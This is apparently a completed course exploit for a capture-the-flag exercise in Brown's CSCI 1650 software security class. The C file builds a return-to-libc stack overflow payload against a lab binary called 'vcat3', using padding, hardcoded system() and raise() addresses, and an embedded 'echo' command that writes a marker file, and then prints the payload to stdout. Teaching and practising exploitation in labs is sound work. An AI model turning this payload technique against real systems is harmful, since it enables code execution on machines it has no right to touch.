/*
 * CTF-2 `vcat3' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	/* BELOW IS THE FIRST RETURN ADDRESS OVERWRITTEN */
	/* ------------------------------------	*/
	"\x40\x90\xE9\xB5"	// System Address
	"\x40\x8D\xE8\xB5"	// Raise Address (return address of System)
	"\x84\xB6\xFF\xBF"	// Pointer to System's argument (on stack)
	"\x0C\x00\x00\x00"	// Raise's Argument
	"\x65\x63\x68\x6F"	// "echo"
	"\x20\x2D\x6E\x20"	// " -n "
	"\x78\x79\x7A\x7A"	// "xyzz"
	"\x79\x21\x20\x3E"	// "y! >"
	"\x20\x6D\x61\x67"	// " mag"
	"\x69\x63\x2E\x74"	// "ic.t"
	"\x78\x74\x00\x00"	// "xt\0\0"

	/* USEFUL NOTES */
	// 0xb5e710f0 is start address of libc text segment

;

int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
